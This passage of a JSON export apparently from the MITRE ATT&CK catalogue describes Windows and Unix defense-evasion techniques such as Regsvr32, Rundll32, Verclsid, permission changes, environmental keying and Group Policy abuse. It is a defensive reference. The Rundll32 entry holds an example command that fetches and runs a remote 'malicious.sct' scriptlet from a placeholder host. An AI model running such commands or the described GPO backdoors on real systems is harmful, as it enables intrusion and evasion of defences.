    "id": "attack-pattern--c48a67ee-b657-45c1-91bf-6cdbe27205f8",
    "platform": "windows",
    "tid": "T1218.009",
    "technique": "Regsvcs/Regasm",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET <a href=\"https://attack.mitre.org/techniques/T1559/001\">Component Object Model</a> (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)<!-- raw HTML omitted --><!-- raw HTML omitted -->Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <!-- raw HTML omitted -->[ComRegisterFunction]<!-- raw HTML omitted --> or <!-- raw HTML omitted -->[ComUnregisterFunction]<!-- raw HTML omitted --> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)</p>\n",
    "technique_references": [
      {
        "source_name": "MSDN Regsvcs",
        "url": "https://msdn.microsoft.com/en-us/library/04za0hca.aspx",
        "description": "Microsoft. (n.d.). Regsvcs.exe (.NET Services Installation Tool). Retrieved July 1, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN Regasm",
        "url": "https://msdn.microsoft.com/en-us/library/tzat5yw6.aspx",
        "description": "Microsoft. (n.d.). Regasm.exe (Assembly Registration Tool). Retrieved July 1, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Regsvcs",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/",
        "description": "LOLBAS. (n.d.). Regsvcs.exe. Retrieved July 31, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Regasm",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Regasm/",
        "description": "LOLBAS. (n.d.). Regasm.exe. Retrieved July 31, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
    "platform": "windows",
    "tid": "T1218.010",
    "technique": "Regsvr32",
    "tactic": "defense-evasion",
    "datasources": "loaded-dlls|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. (Citation: Microsoft Regsvr32)<!-- raw HTML omitted --><!-- raw HTML omitted -->Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a “Squiblydoo” attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)<!-- raw HTML omitted --><!-- raw HTML omitted -->Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via <a href=\"https://attack.mitre.org/techniques/T1546/015\">Component Object Model Hijacking</a>. (Citation: Carbon Black Squiblydoo Apr 2016)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Regsvr32",
        "url": "https://support.microsoft.com/en-us/kb/249873",
        "description": "Microsoft. (2015, August 14). How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Regsvr32",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/",
        "description": "LOLBAS. (n.d.). Regsvr32.exe. Retrieved July 31, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Carbon Black Squiblydoo Apr 2016",
        "url": "https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/",
        "description": "Nolen, R. et al.. (2016, April 28). Threat Advisory: “Squiblydoo” Continues Trend of Attackers Using Native OS Tools to “Live off the Land”. Retrieved April 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Regsvr32 Targeting Mongolian Gov",
        "url": "https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html",
        "description": "Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government. Retrieved February 24, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
    "platform": "windows",
    "tid": "T1218.011",
    "technique": "Rundll32",
    "tactic": "defense-evasion",
    "datasources": "dll-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. <a href=\"https://attack.mitre.org/techniques/T1129\">Shared Modules</a>), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.<!-- raw HTML omitted --><!-- raw HTML omitted -->Rundll32.exe can also be used to execute <a href=\"https://attack.mitre.org/techniques/T1218/002\">Control Panel</a> Item files (.cpl) through the undocumented shell32.dll functions <!-- raw HTML omitted -->Control_RunDLL<!-- raw HTML omitted --> and <!-- raw HTML omitted -->Control_RunDLLAsUser<!-- raw HTML omitted -->. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)<!-- raw HTML omitted --><!-- raw HTML omitted -->Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <!-- raw HTML omitted -->rundll32.exe javascript:”..\\mshtml,RunHTMLApplication “;document.write();GetObject(“script:https[:]//www[.]example[.]com/malicious.sct”)“<!-- raw HTML omitted -->  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)</p>\n",
    "technique_references": [
      {
        "source_name": "Trend Micro CPL",
        "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
        "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "This is Security Command Line Confusion",
        "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/",
        "description": "B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--808e6329-ca91-4b87-ac2d-8eadc5f8f327",
    "platform": "windows",
    "tid": "T1218.012",
    "technique": "Verclsid",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <!-- raw HTML omitted -->verclsid.exe /S /C {CLSID}<!-- raw HTML omitted -->, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to <a href=\"https://attack.mitre.org/techniques/T1218/010\">Regsvr32</a>). Since it is signed and native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub)</p>\n",
    "technique_references": [
      {
        "source_name": "WinOSBite verclsid.exe",
        "url": "https://www.winosbite.com/verclsid-exe/ ",
        "description": "verclsid-exe. (2019, December 17). verclsid.exe File Information - What is it & How to Block . Retrieved August 10, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "LOLBAS Verclsid",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Verclsid/",
        "description": "LOLBAS. (n.d.). Verclsid.exe. Retrieved August 10, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Red Canary Verclsid.exe",
        "url": "https://redcanary.com/blog/verclsid-exe-threat-detection/",
        "description": "Haag, M., Levan, K. (2017, April 6). Old Phishing Attacks Deploy a New Methodology: Verclsid.exe. Retrieved August 10, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "BOHOPS Abusing the COM Registry",
        "url": "https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/",
        "description": "BOHOPS. (2018, August 18). Abusing the COM Registry Structure (Part 2): Hijacking & Loading Techniques. Retrieved August 10, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Nick Tyrer GitHub",
        "url": "https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5",
        "description": "Tyrer, N. (n.d.). Instructions. Retrieved August 10, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee",
    "platform": "windows",
    "tid": "T1222.001",
    "technique": "Windows File and Directory Permissions Modification",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).<!-- raw HTML omitted --><!-- raw HTML omitted -->Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can interact with the DACLs using built-in Windows commands, such as <code>icacls</code>, <code>cacls</code>, <code>takeown</code>, and <code>attrib</code>, which can grant adversaries higher permissions on specific files and folders. Further, <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via <a href=\"https://attack.mitre.org/techniques/T1546/008\">Accessibility Features</a>, <a href=\"https://attack.mitre.org/techniques/T1037\">Boot or Logon Initialization Scripts</a>, or tainting/hijacking other instrumental binary/configuration files via <a href=\"https://attack.mitre.org/techniques/T1574\">Hijack Execution Flow</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "Hybrid Analysis Icacls1 June 2018",
        "url": "https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100",
        "description": "Hybrid Analysis. (2018, June 12). c9b65b764985dfd7a11d3faf599c56b8.exe. Retrieved August 19, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Hybrid Analysis Icacls2 May 2018",
        "url": "https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110",
        "description": "Hybrid Analysis. (2018, May 30). 2a8efbfadd798f6111340f7c1c956bee.dll. Retrieved August 19, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft DACL May 2018",
        "url": "https://docs.microsoft.com/windows/desktop/secauthz/dacls-and-aces",
        "description": "Microsoft. (2018, May 30). DACLs and ACEs. Retrieved August 19, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Access Control Lists May 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists",
        "description": "M. Satran, M. Jacobs. (2018, May 30). Access Control Lists. Retrieved February 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "EventTracker File Permissions Feb 2014",
        "url": "https://www.eventtracker.com/tech-articles/monitoring-file-permission-changes-windows-security-log/",
        "description": "Netsurion. (2014, February 19). Monitoring File Permission Changes with the Windows Security Log. Retrieved August 19, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
    "platform": "macos|linux",
    "tid": "T1222.002",
    "technique": "Linux and Mac File and Directory Permissions Modification",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).<!-- raw HTML omitted --><!-- raw HTML omitted -->Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <!-- raw HTML omitted -->chown<!-- raw HTML omitted --> (short for change owner), and <!-- raw HTML omitted -->chmod<!-- raw HTML omitted --> (short for change mode).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via <a href=\"https://attack.mitre.org/techniques/T1546/004\">.bash_profile and .bashrc</a> or tainting/hijacking other instrumental binary/configuration files via <a href=\"https://attack.mitre.org/techniques/T1574\">Hijack Execution Flow</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "Hybrid Analysis Icacls1 June 2018",
        "url": "https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100",
        "description": "Hybrid Analysis. (2018, June 12). c9b65b764985dfd7a11d3faf599c56b8.exe. Retrieved August 19, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Hybrid Analysis Icacls2 May 2018",
        "url": "https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110",
        "description": "Hybrid Analysis. (2018, May 30). 2a8efbfadd798f6111340f7c1c956bee.dll. Retrieved August 19, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f244b8dd-af6c-4391-a497-fc03627ce995",
    "platform": "linux|macos|windows",
    "tid": "T1480.001",
    "technique": "Environmental Keying",
    "tactic": "defense-evasion",
    "datasources": "process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of <a href=\"https://attack.mitre.org/techniques/T1480\">Execution Guardrails</a> that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)<!-- raw HTML omitted --><!-- raw HTML omitted -->Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).<!-- raw HTML omitted --><!-- raw HTML omitted -->Similar to <a href=\"https://attack.mitre.org/techniques/T1027\">Obfuscated Files or Information</a>, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.<!-- raw HTML omitted --><!-- raw HTML omitted -->Like other <a href=\"https://attack.mitre.org/techniques/T1480\">Execution Guardrails</a>, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical <a href=\"https://attack.mitre.org/techniques/T1497\">Virtualization/Sandbox Evasion</a>. While use of <a href=\"https://attack.mitre.org/techniques/T1497\">Virtualization/Sandbox Evasion</a> may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.</p>\n",
    "technique_references": [
      {
        "source_name": "EK Clueless Agents",
        "url": "https://www.schneier.com/academic/paperfiles/paper-clueless-agents.pdf",
        "description": "Riordan, J., Schneier, B. (1998, June 18). Environmental Key Generation towards Clueless Agents. Retrieved January 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky Gauss Whitepaper",
        "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf",
        "description": "Kaspersky Lab. (2012, August). Gauss: Abnormal Distribution. Retrieved January 17, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Proofpoint Router Malvertising",
        "url": "https://www.proofpoint.com/us/threat-insight/post/home-routers-under-attack-malvertising-windows-android-devices",
        "description": "Kafeine. (2016, December 13). Home Routers Under Attack via Malvertising on Windows, Android Devices. Retrieved January 16, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "EK Impeding Malware Analysis",
        "url": "https://pdfs.semanticscholar.org/2721/3d206bc3c1e8c229fb4820b6af09e7f975da.pdf",
        "description": "Song, C., et al. (2012, August 7). Impeding Automated Malware Analysis with Environment-sensitive Malware. Retrieved January 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Environmental Keyed HTA",
        "url": "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/",
        "description": "Warren, R. (2017, August 8). Smuggling HTA files in Internet Explorer/Edge. Retrieved January 16, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Ebowla: Genetic Malware",
        "url": "https://github.com/Genetic-Malware/Ebowla/blob/master/Eko_2016_Morrow_Pitts_Master.pdf",
        "description": "Morrow, T., Pitts, J. (2016, October 28). Genetic Malware: Designing Payloads for Specific Targets. Retrieved January 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Demiguise Guardrail Router Logo",
        "url": "https://github.com/nccgroup/demiguise/blob/master/examples/virginkey.js",
        "description": "Warren, R. (2017, August 2). Demiguise: virginkey.js. Retrieved January 17, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163",
    "platform": "windows",
    "tid": "T1484.001",
    "technique": "Group Policy Modification",
    "tactic": "defense-evasion",
    "datasources": "windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path <!-- raw HTML omitted -->\\&lt;DOMAIN&gt;\\SYSVOL&amp;lt;DOMAIN&gt;\\Policies&lt;/code&gt;.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) <!-- raw HTML omitted --><!-- raw HTML omitted -->Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.<!-- raw HTML omitted --><!-- raw HTML omitted -->Malicious GPO modifications can be used to implement many other malicious behaviors such as <a href=\"https://attack.mitre.org/techniques/T1053\">Scheduled Task/Job</a>, <a href=\"https://attack.mitre.org/techniques/T1562/001\">Disable or Modify Tools</a>, <a href=\"https://attack.mitre.org/techniques/T1105\">Ingress Tool Transfer</a>, <a href=\"https://attack.mitre.org/techniques/T1136\">Create Account</a>, <a href=\"https://attack.mitre.org/techniques/T1035\">Service Execution</a>,  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, publicly available scripts such as <!-- raw HTML omitted -->New-GPOImmediateTask<!-- raw HTML omitted --> can be leveraged to automate the creation of a malicious <a href=\"https://attack.mitre.org/techniques/T1053\">Scheduled Task/Job</a> by modifying GPO settings, in this case modifying <!-- raw HTML omitted -->&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml<!-- raw HTML omitted -->.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <!-- raw HTML omitted -->&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf<!-- raw HTML omitted -->, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary’s control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet Group Policy Basics",
        "url": "https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/",
        "description": "srachui. (2012, February 13). Group Policy Basics – Part 1: Understanding the Structure of a Group Policy Object. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ADSecurity GPO Persistence 2016",
        "url": "https://adsecurity.org/?p=2716",
        "description": "Metcalf, S. (2016, March 14). Sneaky Active Directory Persistence #17: Group Policy. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Wald0 Guide to GPOs",
        "url": "https://wald0.com/?p=179",
        "description": "Robbins, A. (2018, April 2). A Red Teamer’s Guide to GPOs and OUs. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y Abusing GPO Permissions",
        "url": "http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/",
        "description": "Schroeder, W. (2016, March 17). Abusing GPO Permissions. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant M Trends 2016",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf",
        "description": "Mandiant. (2016, February 25). Mandiant M-Trends 2016. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Hacking Team Breach",
        "url": "https://www.microsoft.com/security/blog/2016/06/01/hacking-team-breach-a-cyber-jurassic-park/",
        "description": "Microsoft Secure Team. (2016, June 1). Hacking Team Breach: A Cyber Jurassic Park. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y SeEnableDelegationPrivilege Right",
        "url": "http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/",
        "description": "Schroeder, W. (2017, January 10). The Most Dangerous User Right You (Probably) Have Never Heard Of. Retrieved March 5, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163",
    "platform": "windows",
    "tid": "T1484.001",
    "technique": "Group Policy Modification",
    "tactic": "privilege-escalation",
    "datasources": "windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path <!-- raw HTML omitted -->\\&lt;DOMAIN&gt;\\SYSVOL&amp;lt;DOMAIN&gt;\\Policies&lt;/code&gt;.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) <!-- raw HTML omitted --><!-- raw HTML omitted -->Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.<!-- raw HTML omitted --><!-- raw HTML omitted -->Malicious GPO modifications can be used to implement many other malicious behaviors such as <a href=\"https://attack.mitre.org/techniques/T1053\">Scheduled Task/Job</a>, <a href=\"https://attack.mitre.org/techniques/T1562/001\">Disable or Modify Tools</a>, <a href=\"https://attack.mitre.org/techniques/T1105\">Ingress Tool Transfer</a>, <a href=\"https://attack.mitre.org/techniques/T1136\">Create Account</a>, <a href=\"https://attack.mitre.org/techniques/T1035\">Service Execution</a>,  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)<!-- raw HTML omitted --><!-- raw HTML omitted -->For example, publicly available scripts such as <!-- raw HTML omitted -->New-GPOImmediateTask<!-- raw HTML omitted --> can be leveraged to automate the creation of a malicious <a href=\"https://attack.mitre.org/techniques/T1053\">Scheduled Task/Job</a> by modifying GPO settings, in this case modifying <!-- raw HTML omitted -->&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml<!-- raw HTML omitted -->.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <!-- raw HTML omitted -->&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf<!-- raw HTML omitted -->, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary’s control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet Group Policy Basics",
        "url": "https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/",
        "description": "srachui. (2012, February 13). Group Policy Basics – Part 1: Understanding the Structure of a Group Policy Object. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ADSecurity GPO Persistence 2016",
        "url": "https://adsecurity.org/?p=2716",
        "description": "Metcalf, S. (2016, March 14). Sneaky Active Directory Persistence #17: Group Policy. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Wald0 Guide to GPOs",
        "url": "https://wald0.com/?p=179",
